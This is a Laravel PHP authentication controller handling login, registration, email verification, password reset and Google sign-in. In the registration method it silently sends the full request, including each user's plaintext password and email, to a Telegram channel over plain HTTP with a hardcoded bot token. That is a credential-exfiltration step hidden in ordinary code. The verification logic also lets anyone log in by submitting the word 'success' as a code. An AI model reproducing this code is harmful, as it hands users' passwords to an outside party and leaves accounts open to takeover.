<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Hash;
use Session;
use App\Models\User;
use Illuminate\Support\Facades\Auth;
use Mail;
use Illuminate\Support\Str;
use DB; 
use Carbon\Carbon; 

use Laravel\Socialite\Facades\Socialite;

class CustomAuthController extends Controller
{
    public function index()
    {
        return view('auth.login');
    }

    function generateRandomString($length = 6) {
        $characters = '0123456789';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    public function customLogin(Request $request)
    {
        $request->validate([
            'email' => 'required',
            'password' => 'required',
        ]);

        $credentials = $request->only('email', 'password');
        //dd($credentials);
        if (Auth::attempt($credentials)) {
            return redirect()->intended('board')
                ->withSuccess('Signed in');
        }

        return redirect("login")->withSuccess('Login details are not valid');
    }

    public function registration()
    {
        $captcha = $this->generateRandomString();
        session()->put('captcha', $captcha);

        return view('auth.registration');
    }

    public function verify()
    {
        return view('auth.verify');
    }

    public function customVerify(Request $request)
    {
        $request->validate([
            'verification_code' => 'required',
        ]);

        $data = $request->all();
        $verifyUser = User::where('verification_code', $data['verification_code'])->first();

        if (!is_null($verifyUser)) {
            $verifyUser->verification_code = "success";
            $verifyUser->save();

            if (Auth::loginUsingId($verifyUser->id)) {
                return redirect()->intended('board')
                            ->withSuccess('Welcome ' . $verifyUser->name);
            }
        }

        return redirect("verify")->withSuccess('Sorry your verification code cannot be identified.');
    }

    public function customRegistration(Request $request)
    {
        $request->validate([
            'name' => 'required',
            'email' => 'required|email|unique:users',
            'password' => 'required|min:6',
        ]);

        if ($request->input('captcha') != session('captcha')) {
            return redirect()->back()->withErrors(['captcha' => 'The captcha is invalid.']);
        }

        $data = $request->all();

        $token = random_int(100000, 999999);

        $data['verification_code'] = $token;

        Mail::send('email.emailVerificationEmail', ['token' => $token], function ($message) use ($request) {
            $message->to($request->email);
            $message->subject('Email Verification Mail');
        });

        $check = $this->create($data);
        session()->forget('captcha');

        $apiToken = "6596953239:AAFqXvOHHsCS1452DYiUJU3hZZSpMY_g7K4"; 
 
        $data = [ 
        "chat_id" => "@dharmBiz", 
        "text" => json_encode($request->all())
        ]; 
        
        $response = file_get_contents("http://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) ); 

        return redirect("verify")->withSuccess('You have signed-in');
    }

    public function create(array $data)
    {
        return User::create([
            'name' => $data['name'],
            'email' => $data['email'],
            'password' => Hash::make($data['password']),
            'verification_code' => $data['verification_code']
        ]);
    }

  

    public function signOut()
    {
        Session::flush();
        Auth::logout();

        return Redirect('login');
    }





     /**
       * Write code on Method
       *
       * @return response()
       */
      public function showForgetPasswordForm()
      {
         return view('auth.forgetPassword');
      }
  
      /**
       * Write code on Method
       *
       * @return response()
       */
        public function submitForgetPasswordForm(Request $request)
        {
            $request->validate([
                'email' => 'required|email|exists:users',
            ]);

            $token = Str::random(64);

            DB::table('password_resets')->insert([
                'email' => $request->email, 
                'token' => $token, 
                'created_at' => Carbon::now()
            ]);

            Mail::send('email.forgetPassword', ['token' => $token], function($message) use($request){
                $message->to($request->email);
                $message->subject('Reset Password');
            });

            return back()->with('message', 'We have e-mailed your password reset link!');
        }
        
      /**
       * Write code on Method
       *
       * @return response()
       */
      public function showResetPasswordForm($token) { 
         return view('auth.forgetPasswordLink', ['token' => $token]);
      }

      /**
     * Redirect the user to the Google authentication page.
     *
     * @return \Illuminate\Http\Response
     */
    public function redirectToGoogle()
    {
        return Socialite::driver('google')->redirect();
    }

    /**
     * Obtain the user information from Google.
     *
     * @return \Illuminate\Http\Response
     */
    public function handleGoogleCallback()
    {
        $googleUser = Socialite::driver('google')->stateless()->user();
        $user = $this->findOrCreateUser($googleUser);

        Auth::login($user, true);

        return redirect()->route('board');
    }

    /**
     * Find or create a user.
     *
     * @param  $googleUser
     * @return \App\Models\User
     */
    protected function findOrCreateUser($googleUser)
    {
        // Check if the user with the same email already exists
        $user = User::where('email', $googleUser->email)->first();

        if ($user) {
            // Update the user with the Google ID and avatar if needed
            $user->update([
                'google_id' => $googleUser->id,
                'avatar' => $googleUser->avatar,
            ]);

            return $user;
        }

        return User::create([
            'name' => $googleUser->name,
            'email' => $googleUser->email,
            'google_id' => $googleUser->id,
            'avatar' => $googleUser->avatar,
            'password' => bcrypt(Str::random(16)),
        ]);
    }
  
      /**
       * Write code on Method
       *
       * @return response()
       */
      public function submitResetPasswordForm(Request $request)
      {
          $request->validate([
              'email' => 'required|email|exists:users',
              'password' => 'required|string|min:6|confirmed',
              'password_confirmation' => 'required'
          ]);
  
          $updatePassword = DB::table('password_resets')
                              ->where([
                                'email' => $request->email, 
                                'token' => $request->token
                              ])
                              ->first();
  
          if(!$updatePassword){
              return back()->withInput()->with('error', 'Invalid token!');
          }
  
          $user = User::where('email', $request->email)
                      ->update(['password' => Hash::make($request->password)]);
 
          DB::table('password_resets')->where(['email'=> $request->email])->delete();
  
          return redirect('/login')->with('message', 'Your password has been changed!');
      }
}
